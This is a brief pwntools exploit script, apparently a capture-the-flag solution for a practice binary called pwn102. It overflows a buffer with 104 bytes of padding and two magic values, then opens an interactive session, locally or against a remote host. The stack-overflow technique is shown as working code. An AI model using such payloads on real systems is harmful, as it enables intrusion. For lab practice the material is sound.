from pwn import *
from struct import pack
import sys

context.binary = exe = ELF("./pwn102.pwn102", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "warning"

class Exploit:
    def __init__(self, p: process):
        self.p = p
    
    def debug(self, script):
        attach(self.p, script)
        
    def send(self, content):
        p = self.p
        p.sendlineafter(b"Am I right?", content)

if args.REMOTE:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process()

x = Exploit(p)

payload = b""
payload += cyclic(104)
payload += pack("<I", 0xC0D3)
payload += pack("<I", 0xC0FF33)

# x.debug("break *main+91\nc")
x.send(payload)
p.interactive()